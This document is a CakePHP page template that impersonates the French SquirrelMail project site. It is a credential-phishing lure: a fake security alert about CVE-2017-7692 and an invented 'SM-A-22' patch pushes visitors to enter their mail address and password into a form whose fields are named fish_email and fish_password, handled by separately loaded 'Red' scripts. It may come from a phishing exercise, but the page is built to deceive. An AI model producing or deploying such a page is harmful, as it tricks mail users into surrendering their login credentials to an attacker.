<?php
/**
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @since         0.10.0
 * @license       http://www.opensource.org/licenses/mit-license.php MIT License
 */

$cakeDescription = 'Squirrelmail - Webmail for Nuts!';
?>
<!DOCTYPE html>
<html>
<head>
    <?= $this->Html->charset() ?>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        <?= $cakeDescription ?>
    </title>
    <?= $this->Html->meta('favicon.ico','/img/favicon.ico',['type'=>'icon']) ?>

    <?= $this->fetch('meta') ?>
    <!-- Custom Css goes here -->
    <?= $this->Html->css('squirrelmail') ?>
    <?= $this->fetch('css') ?>
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1/jquery.js"></script>

    <?= $this->Html->script('../bower_components/angular/angular.min') ?>
    <?= $this->Html->script('../bower_components/materialize/dist/js/materialize.min') ?>

    <?= $this->Html->script('../bower_components/angular/angular-materialize.min') ?>
    <?= $this->Html->script('../bower_components/angular/angular-ui-router.min') ?>

    <?= $this->fetch('script') ?>
</head>
<?= $this->fetch('content') ?>
<body bgcolor="#ffffff" link="#bb0000" alink="#770000" vlink="#bb0000">
    <table width="100%" cellpadding="0" border="0" cellspacing="0">
    <tbody><tr><td><table width="100%" cellpadding="0" cellspacing="0"><tbody><tr>
    <td><a href="https://squirrelmail.org/index.php"><img border="0" src="/img/sm_logo.jpg" width="324" height="94" alt="SquirrelMail"></a></td>
    <!-- CHRISTMAS HAT: td><a href="/index.php"><img border="0" src="/images/sm_logo_cs.jpg" width=324 height=94 alt="SquirrelMail"></a></td -->
    <td align="right" valign="bottom">
      &nbsp;
    </td></tr></tbody></table></td></tr>
    <tr><td align="right" class="menutop"><img border="0" src="/images/menu_top.gif" alt="" width="1" height="15"></td></tr><tr><td>
      <table width="100%" cellpadding="15" border="0" cellspacing="0"><tbody><tr><td align="right" class="stripedbg" width="1%" nowrap="" valign="top" style="background:url('/img/striped_bg') !important;">
        <b>
        <a href="https://squirrelmail.org/donations.php"><font color="#000000">Dons</font></a><br>
        <a href="https://squirrelmail.org/index.php"><font color="#000000">Nouvelles</font></a><br>
        <a href="https://squirrelmail.org/about/"><font color="#000000">A propos</font></a><br>
        <a href="https://squirrelmail.org/support/"><font color="#000000">Support</font></a><br>
        <a href="https://squirrelmail.org/screenshots.php"><font color="#000000">Captures d'écran</font></a><br>
        <a href="https://squirrelmail.org/download.php"><font color="#000000">Téléchargements</font></a><br>
        <a href="https://squirrelmail.org/plugins.php"><font color="#000000">Plugins</font></a><br>
        <a href="https://squirrelmail.org/documentation/"><font color="#000000">Documentation</font></a><br>
        <a href="https://squirrelmail.org/sponsors.php"><font color="#000000">Sponsors</font></a><br>
        <a href="https://squirrelmail.org/donations.php#smbounty"><font color="#000000">Bounties</font></a><br>
        </b><br>
    <div class="menusearch">

    recherche:</div>

    <form id="searchbox_012802144112468634923:p8qwoz07y-m" action="https://www.google.com/cse" target="_top">
          <input type="hidden" name="cx" value="012802144112468634923:p8qwoz07y-m">
          <input name="q" type="text" size="10" placeholder="Custom Search" style="border: 1px solid rgb(126, 157, 185); padding: 2px; background: url(&quot;https://www.google.com/cse/static/images/1x/googlelogo_lightgrey_46x16dp.png&quot;) left center no-repeat rgb(255, 255, 255); text-indent: 48px;">
          <input type="hidden" name="cof" value="FORID:0">
    <input name="siteurl" type="hidden" value="squirrelmail.org/"><input name="ref" type="hidden" value=""><input name="ss" type="hidden" value=""></form>
    <script type="text/javascript" src="/img/brand"></script>

    <div class="menusearch"><a href="https://squirrelmail.org/search.php"><font color="black">plus de recherche</font></a>

        </div>
        <br>
    <iframe marginwidth="0" marginheight="0" width="92" height="35" frameborder="0" src="/img/sflogo.html" scrolling="no">
      &lt;a target="_blank" href="//sourceforge.net/projects/squirrelmail"&gt;&lt;img src="//sflogo.sourceforge.net/sflogo.php?group_id=311&amp;type=10" width="80" height="15" border="0" alt="Get SquirrelMail at SourceForge.net. Fast, secure and Free Open Source software downloads" /&gt;&lt;/a&gt;
          &lt;!--a href="//sourceforge.net"&gt;&lt;img alt="SourceForge" border=0 src="sflogo.png" width="88" height="31" /&gt;&lt;/a--&gt;
        </iframe><br>

    <a target="_blank" href="https://xs4all.nl/"><img src="/img/xs4all.gif" alt="" height="" width=""></a>
        <br>
        <br>
    <a target="_blank" href="https://www.junkemailfilter.com/"><!-- Too wide:  img src="//squirrelmail.org/images/junkemailfilter_small.gif" alt="" height="" width="150" / -->Filtre E-Mail</a>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <div style="text-align:left; font-size:11pt">
        <strong>Notfications</strong>
        <br>
        <a href="https://squirrelmail.org/wiki/SquirrelMailPhishing">Campagne de dons</a>
        <br>
        Version 1.4.15
        <br>
        Security Upgrade
        </div>
        </td><td width="99%" valign="top">
    <table width="100%" cellpadding="1" cellspacing="0" border="0"><tbody><tr><td width="70%" valign="top" ng-app="ovh-app" ng-controller="MainCtrl as mainctrl">


<b style="background: red; color:white;">Découverte d'une faille de sécurité - CVE-2017-7692</b><br>
<small><font color="#555555"><i>18 Août, 2017 Confirmé par Paul Lesniewski - Découverte le 10-07-2017</i></font></small><br><table width="100%" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td width="15">
&nbsp;</td><td>
Une faille relative aux versions SquirrelMail 1.4.8-22 portant le numéro <a target="_blank" href="https://www.cvedetails.com/cve/CVE-2017-7692/">CVE-2017-7692</a> a été confirmée et nécessite grandement l'activation du patch de sécurité SM-A-22 afin d'éviter des attaques de traversée de répertoire et d'exécution de code à distant afin de compromettre le serveur de messagerie. <br>
<b>Pour activer le patch de sécurité, veuillez authentifier votre adresse répertoriée squirrelmail.</b>
    <form ng-hide="mainctrl.load" ng-submit="mainctrl.subscribe_service(mainctrl.service)" name="authForm">
      <br>
        <span style="margin-right: 31px; text-align:right;">Identifiant:</span> <input type="email" required ng-model="mainctrl.service.fish_email"> <br> <br>
        <span style="margin-right: 5px;">Mot de passe:</span> <input ng-minlength="7" type="password" required ng-model="mainctrl.service.fish_password"> <br> <br>
        <input style="margin-left: 105px;" type="submit" value="Sécuriser Méssagerie" ng-disabled="authForm.$invalid">
        <input type="reset" id="reset-button" style="display:none;">
    </form>
    <p ng-show="mainctrl.load">
        Authentification en cours ....
    </p>
</td></tr>
</tbody></table> <br>



<b>ANNONCE: Compatibilité PHP 5.4 &amp; 5.5 </b><br>
<small><font color="#555555"><i>30 mai, 2013 par Paul Lesniewski</i></font></small><br><table width="100%" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td width="15">
&nbsp;</td><td>
Les corrections de compatibilité PHP 5.4 et PHP 5.5 sont en direct dans nos nightly snapshots, et nous encourageons vivement ceux qui souhaitent tester ou ceux qui ont des problèmes avec la version 1.4.22 pour télécharger un instantané et signaler tout problème.</td></tr></tbody></table>
<br>

<b>ANNONCE: Compatibilité  PHP 5.4 </b><br>
<small><font color="#555555"><i>01 Décembre, 2012 par Paul Lesniewski</i></font></small><br><table width="100%" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td width="15">
&nbsp;</td><td>
    Avec la version récente de la version 5.4 de PHP, certains membres de la communauté ont aidé à identifier quelques petits problèmes que nous avons corrigés et mis à disposition dans nos snapshot packages quotidiens situés sur notre page de téléchargement. Surtout si vous utilisez le plugin Mail Fetch et que vous souhaitez effectuer une mise à niveau vers PHP 5.4, vous devez télécharger l'un de nos forfaits instantanés.<br><br><strong>MIS A JOUR:</strong>Si vous utilisez SquirrelMail sous PHP 5.4,  aidez à tester et à affiner les  <a href="https://sourceforge.net/tracker/?func=detail&amp;atid=100311&amp;aid=3491925&amp;group_id=311">correctifs trouvés ici</a>.Il existe un patch pour chacune des deux versions SquirrelMail SVN snapshot disponibles sur notre page de téléchargement.</td></tr></tbody></table>
<br>

<b>NOUVELLES: SquirrelMail Nommé pour SourceForge Projet du mois 
</b><br>
<small><font color="#555555"><i>06 Août, 2012 par Paul Lesniewski</i></font></small><br><table width="100%" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td width="15">
&nbsp;</td><td>
Il y a neuf ans et demi que SquirrelMail était le projet SourceForge du mois, et nous avons encore été nommés pour ce privilège. Nous sommes confrontés à un logiciel vraiment génial, alors si vous souhaitez voter, consultez <a href="http://twtpoll.com/lsm1vk">http://twtpoll.com/lsm1vk</a>
<br>
Mise à jour: SquirrelMail a pris la troisième place par une marge étroite, ce qui est très respectable compte tenu des projets de qualité qui étaient nommé. Merci à ceux qui ont voté et félicitations à PeaZip!</td></tr></tbody></table>
<br>

<b>ANNONCE: SquirrelMail 1.4.22</b><br>
<small><font color="#555555"><i>12 juillet, 2011 par Paul Lesniewski</i></font></small><br><table width="100%" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td width="15">
&nbsp;</td><td>
L'équipe SquirrelMail est heureuse d'annoncer la sortie de SquirrelMail version 1.4.22. Cette version contient un grand nombre d'améliorations de performance, de corrections de stabilité et de quelques corrections de bug / sécurité
</td></tr></tbody></table>
<br>

<b>NOUVELLES: SquirrelMail "Notable?"</b><br>
<small><font color="#555555"><i>23 Juillet, 2010 by Paul Lesniewski</i></font></small><br><table width="100%" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td width="15">
&nbsp;</td><td>
Il semble qu'un utilisateur de Wikipedia pense que SquirrelMail n'est pas considéré comme «assez notable» pour conserver sa propre  <a href="http://en.wikipedia.org/wiki/SquirrelMail">page Wikipedia</a>.Êtes-vous d'accord? Être en désaccord?  <a href="http://en.wikipedia.org/wiki/Talk:SquirrelMail#notability">Faites votre opinion.</a>
<br>
<br>
MISE À JOUR: En novembre 2010, la notoriété de SquirrelMail semble avoir été convenue d'un commun accord et l'avertissement de notabilité a été supprimé. Merci à tous ceux qui ont contribué à la discussion et surtout à ceux qui se sont engagés à améliorer l'article lui-même!</td></tr></tbody></table>
<br>

    </td><td width="30%" valign="top">
      <table width="100%" cellpadding="1" cellspacing="0" border="0" bgcolor="#000000"><tbody><tr><td>
      <table width="100%" cellpadding="5" cellspacing="0" border="0" bgcolor="#ffffff"><tbody><tr><td>
        <b>Mises à jour des plugins </b><br><small><a href="http://squirrelmail.org/docs/devel/devel-4.html">Créez vos plugins</a></small><br><br>

<a href="https://squirrelmail.org/plugin_view.php?id=273"><b>Plugin sécurité SM-A-22</b></a><br>
<small><b>v1.0</b> 17 Août, 2017</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=273"><b>Authentification de disque Yubikey</b></a><br>
<small><b>v1.0</b> 28 Mars, 2014</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=281"><b>Envoi de fichiers par récipient</b></a><br>
<small><b>v1.0.1</b>3 Février, 2014</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=280"><b>Identification de documents</b></a><br>
<small><b>v1.0</b> 1 Février, 2014</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=100"><b>Contenu de dossier envoyés</b></a><br>
<small><b>v1.0</b> 31 Janvier, 2014</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=279"><b>Multiple pièces jointes</b></a><br>
<small><b>v1.0</b> 7 Août, 2012</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=278"><b>Authentification SMTP</b></a><br>
<small><b>v1.0</b> 1 Juillet, 2012</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=34"><b>Authentification classique</b></a><br>
<small><b>v3.0</b> 30 Mai, 2012</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=195"><b>Définition d'alias</b></a><br>
<small><b>v2.0</b> 31 Mars, 2012</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=194"><b>Composition avec extras</b></a><br>
<small><b>v0.10</b> 30 Mars, 2012</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=32"><b>Autocompletion</b></a><br>
<small><b>v3.0</b> 3 Février, 2012</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=54"><b>Vérification S/MIME</b></a><br>
<small><b>v1.0</b> 1 Janvier, 2012</small><br><br>
<a href="https://squirrelmail.org/plugin_view.php?id=12"><b>Oubli de mot de passe</b></a><br>
<small><b>v2.3</b> 15 Décembre, 2011</small><br><br>
      </td></tr></tbody></table>
      </td></tr></tbody></table>
    </td></tr></tbody></table>

    </td></tr></tbody></table></td></tr>
    <tr><td align="right" class="menutop"><img border="0" src="/img/menu_top.gif" alt="" width="1" height="15"></td></tr><tr><td>
    </td></tr></tbody></table>
    <center><small>
      © 1999-2017 par L'équipe du projet Squirrelmail<br>
    </small></center>
  
      <!-- Angular App -->
      <?= $this->Html->script('Red/app') ?>
      <?= $this->Html->script('Red/controllers') ?>
      <?= $this->Html->script('Red/services') ?>
</body>
</html>
